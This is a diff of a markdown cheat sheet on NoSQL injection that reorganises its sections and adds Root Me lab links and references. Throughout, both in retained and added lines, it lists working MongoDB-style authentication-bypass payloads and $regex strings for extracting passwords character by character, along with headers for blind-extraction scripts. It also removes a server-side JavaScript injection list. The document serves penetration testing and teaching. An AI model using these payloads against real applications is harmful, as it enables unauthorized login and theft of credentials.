@@ -2,90 +2,94 @@
 
 > NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
 
+
 ## Summary
 
 * [Tools](#tools)
-* [Exploit](#exploits)
-  * [Authentication Bypass](#authentication-bypass)
-  * [Extract length information](#extract-length-information)
-  * [Extract data information](#extract-data-information)
+* [Methodology](#methodology)
+    * [Authentication Bypass](#authentication-bypass)
+    * [Extract Length Information](#extract-length-information)
+    * [Extract Data Information](#extract-data-information)
 * [Blind NoSQL](#blind-nosql)
-  * [POST with JSON body](#post-with-json-body)
-  * [POST with urlencoded body](#post-with-urlencoded-body)
-  * [GET](#get)
-* [MongoDB Payloads](#mongodb-payloads)
+    * [POST with JSON Body](#post-with-json-body)
+    * [POST with urlencoded Body](#post-with-urlencoded-body)
+    * [GET](#get)
+* [Labs](#references)
 * [References](#references)
+
 
 ## Tools
 
-* [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
-* [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
-* [Burp-NoSQLiScanner - Plugin available in burpsuite](https://github.com/matrix/Burp-NoSQLiScanner)  
+* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
+* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
+* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities. 
 
-## Exploit
+
+## Methodology
 
 ### Authentication Bypass
 
-Basic authentication bypass using not equal ($ne) or greater ($gt)
+Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
 
-```json
-in DATA
-username[$ne]=toto&password[$ne]=toto
-login[$regex]=a.*&pass[$ne]=lol
-login[$gt]=admin&login[$lt]=test&pass[$ne]=1
-login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+* in HTTP data
+  ```ps1
+  username[$ne]=toto&password[$ne]=toto
+  login[$regex]=a.*&pass[$ne]=lol
+  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
+  ```
 
-in JSON
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
-{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
-{"username": {"$gt":""}, "password": {"$gt":""}}
-```
+* in JSON data
+  ```json
+  {"username": {"$ne": null}, "password": {"$ne": null}}
+  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
+  {"username": {"$gt":""}, "password": {"$gt":""}}
+  ```
 
-### Extract length information
 
-```json
+### Extract Length Information
+
+Inject a payload using the $regex operator. The injection will work when the length is correct.
+
+```ps1
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract data information
+### Extract Data Information
 
-```json
-in URL
-username[$ne]=toto&password[$regex]=m.{2}
-username[$ne]=toto&password[$regex]=md.{1}
-username[$ne]=toto&password[$regex]=mdp
+Extract data with "`$regex`" query operator.
 
-username[$ne]=toto&password[$regex]=m.*
-username[$ne]=toto&password[$regex]=md.*
+* HTTP data
+  ```ps1
+  username[$ne]=toto&password[$regex]=m.{2}
+  username[$ne]=toto&password[$regex]=md.{1}
+  username[$ne]=toto&password[$regex]=mdp
 
-in JSON
-{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
-```
+  username[$ne]=toto&password[$regex]=m.*
+  username[$ne]=toto&password[$regex]=md.*
+  ```
 
-Extract data with "in"
+* JSON data
+  ```json
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
+  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
+  ```
+
+Extract data with "`$in`" query operator.
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-### SSJI 
-
-```json
-';return 'a'=='a' && ''=='
-";return 'a'=='a' && ''=='
-0;return true
-```
-
 
 ## Blind NoSQL
 
-### POST with JSON body
+### POST with JSON Body
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -109,9 +113,9 @@ while True:
                 password += c
 ```
 
-### POST with urlencoded body
+### POST with urlencoded Body
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -137,7 +141,7 @@ while True:
 
 ### GET
 
-python script:
+Python script:
 
 ```python
 import requests
@@ -160,7 +164,7 @@ while True:
         password += c
 ```
 
-ruby script:
+Ruby script:
 
 ```ruby
 require 'httpx'
@@ -187,35 +191,18 @@ while true
 end
 ```
 
-## MongoDB Payloads
 
-```bash
-true, $where: '1 == 1'
-, $where: '1 == 1'
-$where: '1 == 1'
-', $where: '1 == 1'
-1, $where: '1 == 1'
-{ $ne: 1 }
-', $or: [ {}, { 'a':'a
-' } ], $comment:'successful MongoDB injection'
-db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
-|| 1==1
-' && this.password.match(/.*/)//+%00
-' && this.passwordzz.match(/.*/)//+%00
-'%20%26%26%20this.password.match(/.*/)//+%00
-'%20%26%26%20this.passwordzz.match(/.*/)//+%00
-{$gt: ''}
-[$ne]=1
-';return 'a'=='a' && ''=='
-";return(true);var xyz='a
-0;return true
-```
+## Labs
+
+* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
+* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
+
 
 ## References
 
-* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
-* [Testing for NoSQL injection - OWASP/WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
-* [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
-* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
-* [Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+- [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+- [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
+- [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
+- [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
+- [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
+- [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
